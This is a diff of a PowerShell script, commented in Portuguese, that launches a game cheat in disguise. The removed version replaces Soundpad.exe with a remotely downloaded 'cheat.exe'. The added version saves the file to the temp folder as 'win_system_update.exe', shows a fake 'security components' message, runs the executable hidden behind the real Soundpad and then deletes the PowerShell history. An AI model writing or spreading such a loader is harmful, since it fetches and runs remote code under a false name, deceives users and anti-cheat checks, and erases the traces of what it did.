@@ -1,33 +1,20 @@
-# 1. CONFIGURAÇÕES
-$CheatUrl = "https://raw.githubusercontent.com/enzin762/wasd/main/cheat.exe" # Seu cheat compilado como EXE
-$SoundpadPath = "C:\Program Files (x86 )\Steam\steamapps\common\Soundpad\Soundpad.exe"
-$BackupPath = "C:\Program Files (x86)\Steam\steamapps\common\Soundpad\Soundpad_original.exe"
+# CONFIGURAÇÕES
+$CheatUrl = "https://raw.githubusercontent.com/enzin762/wasd/main/cheat.exe" # Seu cheat x64
+$TempPath = "$env:TEMP\win_system_update.exe" # Nome disfarçado para a tela
 
-# 2. LOCALIZAR PASTA (Caso não seja a padrão)
-if (-not (Test-Path $SoundpadPath)) {
-    $SteamPath = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue
-    $SoundpadPath = "$($SteamPath.InstallPath)\steamapps\common\Soundpad\Soundpad.exe"
-    $BackupPath = (Split-Path $SoundpadPath) + "\Soundpad_original.exe"
-}
+Write-Host "[+] Baixando componentes de segurança..." -ForegroundColor Cyan
 
-Write-Host "[+] Preparando camuflagem..." -ForegroundColor Cyan
+# 1. Baixa o cheat para a pasta temporária
+Invoke-WebRequest -Uri $CheatUrl -OutFile $TempPath -UseBasicParsing
 
-# 3. REALIZAR A TROCA
-Stop-Process -Name "Soundpad" -Force -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 1
+# 2. Inicia o Soundpad original primeiro
+Write-Host "[+] Iniciando Soundpad..." -ForegroundColor Green
+Start-Process "C:\Program Files (x86 )\Steam\steamapps\common\Soundpad\Soundpad.exe"
 
-# Se ainda não houver backup, cria um do original
-if (-not (Test-Path $BackupPath)) {
-    Move-Item $SoundpadPath $BackupPath -Force
-}
+# 3. Inicia o seu cheat x64 em modo oculto
+Write-Host "[+] Iniciando Cheat x64..." -ForegroundColor Green
+Start-Process $TempPath -WindowStyle Hidden
 
-# Baixa o seu cheat com o nome do Soundpad
-Invoke-WebRequest -Uri $CheatUrl -OutFile $SoundpadPath -UseBasicParsing
-
-# 4. INICIAR
-Write-Host "[+] Iniciando Soundpad camuflado..." -ForegroundColor Green
-Start-Process $SoundpadPath
-
-# Limpar rastros do PowerShell
+# 4. Limpa o rastro do PowerShell
 Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
 Write-Host "[OK] Sucesso!" -ForegroundColor Cyan
